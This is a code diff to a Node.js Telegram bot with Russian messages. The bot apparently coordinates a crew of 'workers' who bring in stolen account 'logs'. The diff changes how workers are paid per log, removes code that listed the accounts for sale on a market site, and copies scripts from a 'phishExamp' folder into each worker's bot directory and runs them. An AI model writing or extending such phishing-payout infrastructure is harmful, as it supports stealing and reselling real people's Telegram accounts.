@@ -92,6 +92,10 @@ bot.hears("👨🏼‍💻Ваш профиль", async (ctx) => {
     await ctx.reply(`👨‍💻 Ваш профиль\n\nЛогов всего: ${logsAllTime}\nЛогов за месяц: ${logsMonth}\nЛогов за день: ${logsDay}\n\nБаланс: ${balance}₽\nВсего заработано: ${balanceAllTime}₽`, {reply_markup: keyboard})
 });
 
+bot.hears(/\/id \S+/, async (ctx) => {
+    await ctx.reply(`<a>tg://user?id=${ctx.message.text.split(" ")[1]}</a>`, {parse_mode: "HTML"});
+})
+
 bot.action("withdraw_money", async (ctx) => {
     console.log("1")
     ctx.scene.enter("vivodScene");
@@ -107,6 +111,38 @@ function sleep(ms) {
     });
 }
 
+bot.hears(/\/addBalance \S+ \S+/g, async ctx => {
+    const textSplited = ctx.message.text.split(" ");
+    console.log(textSplited)
+
+    const id = textSplited[1];
+    const balanceBot = Number(textSplited[2]);
+    console.log(id)
+    console.log(balanceBot)
+
+    const logsCount = balanceBot / 15;
+    const addBalance = logsCount * 8;
+
+    const userData = await get(child(ref(db), `users/${id}`));
+    let user = userData.val();
+
+    user.balance += addBalance;
+    user.balanceAllTime += addBalance;
+
+    user.logs.logsAllTime += logsCount;
+    user.logs.logsMonth += logsCount;
+    user.logs.logsDay += logsCount;
+
+    await update(child(ref(db), `users/${id}`), user)
+
+    try {
+        ctx.telegram.sendMessage(id, `✅ Ваши логи были отработаны и на ваш баланс было зачислено ${addBalance} рублей, ${logsCount} логов`);
+    }
+    catch {
+
+    }
+})
+
 const getUpdates = async () => {
     const updatesData = await axios.get("http://localhost:5000/getUpdates");
     const updates = updatesData.data;
@@ -116,76 +152,13 @@ const getUpdates = async () => {
         // newAccount
         if(update.type == "newAccount")
         {
+            console.log(update)
             try{
-                await bot.telegram.sendMessage(update.worker_id, `🎉 Вам пришёл лог #${update.id}! Лог выставляется на маркет, ожидайте.`);
+                await bot.telegram.sendMessage(update.worker_id, `🎉 Вам пришёл лог #${update.id}! Лог добавился администратору, ожидайте пока его продадут.`);
             }
             catch {
 
             }
-        }
-
-        if(update.type == "accCantSell") {
-            try{
-                await bot.telegram.sendMessage(update.worker_id, `❌ Лог #${update.id} не удалось продать, так как аккаунт стал невалид или аккаунт был уже продан кем-то другим.`)
-            }
-            catch {
-
-            }
-        }
-
-        if(update.type == "accAddedOnSell") {
-            try{
-                await bot.telegram.sendMessage(update.worker_id, `✅ Лог #${update.id} был выставлен на продажу! Ожидайте пока его купят.`)
-                await bot.telegram.sendMessage(logsChannelId, `Новый лог #${update.id} от <a href="tg://user?id=${update.worker_id}">воркера</a>`, {parse_mode: 'HTML'})
-            }
-            catch {
-
-            }
-        }
-
-        if(update.type == "accSelled") {
-            const item_id = update.accLink.replace("https://lolz.guru/market/", "");
-            const accsOnSellData = await get(child(ref(db), `accountsOnSell`));
-            let accsOnSell = accsOnSellData.val();
-
-            if(accsOnSell == null) accsOnSell = {};
-
-            const data = accsOnSell[item_id]
-            if(data == undefined) continue;
-            delete accsOnSell[item_id];
-
-            const { worker_id } = data;
-
-            await fire.update(child(ref(db), `accountsOnSell`), accsOnSell);
-
-            try {
-                await bot.telegram.sendMessage(data.worker_id, `🎉 Лог #${data.id} был продан! Вам было зачислено 8 rub!`);
-            }
-            catch {
-
-            }
-
-            const user_data = await get(child(ref(db), `users/${data.worker_id}`));
-            const user = user_data.val();
-
-            user.balance += 8;
-            user.balanceAllTime += 8;
-
-            user.logs.logsAllTime += 1;
-            user.logs.logsMonth += 1;
-            user.logs.logsDay += 1;
-
-            await fire.update(child(ref(db), `users/${data.worker_id}`), user);
-
-            const top_data = await get(child(ref(db), `top`));
-            const top = top_data.val();
-
-            top[worker_id] = {logsAllTime: user.logs.logsAllTime, logsMonth: user.logs.logsMonth, logsDay: user.logs.logsDay};
-
-            await fire.update(child(ref(db), `top`), top);
-
-            // const top_values = Object.keys(top).sort((b, c) => top[c] - top[b]);const top_values = Object.keys(top).sort((b, c) => top[c] - top[b]);
-
         }
     }
 }
@@ -208,7 +181,10 @@ const startBots = new Promise((resolve, reject) => {
             if (!fs.existsSync(`./bots/${directory}/bot.py`)) continue;
 
             console.log(directory)
+
             fs.writeFileSync(`./bots/${directory}/bot.py`, fs.readFileSync(`./phishExamp/bot.py`));
+            fs.writeFileSync(`./bots/${directory}/ClientTelegram.py`, fs.readFileSync(`./phishExamp/ClientTelegram.py`));
+
             cmdWorking(`cd ./bots/${directory} & python bot.py`);
         }
     })
